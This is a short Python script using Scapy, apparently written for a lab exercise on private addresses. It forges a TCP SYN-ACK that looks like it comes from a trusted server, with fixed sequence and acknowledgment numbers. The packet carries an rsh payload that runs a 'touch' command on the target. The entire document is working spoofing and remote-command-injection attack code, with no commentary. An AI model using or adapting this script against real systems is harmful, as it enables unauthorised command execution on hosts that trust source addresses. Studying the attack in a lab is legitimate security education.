from scapy.all import *


x_ip = "192.168.159.130" 
x_port = 1023
srv_ip = "192.168.159.132"
srv_port = 1022

ip = IP(src = srv_ip , dst = x_ip)
tcp = TCP(sport = srv_port , dport = x_port , flags = "SA" , seq = 3821203333, ack =1601243238)


data = '1022\x00seed\x00seed\x00touch NNNNNNNNNN\x00'
pkt = ip/tcp/data

ls(pkt)
send(pkt , verbose = 0)

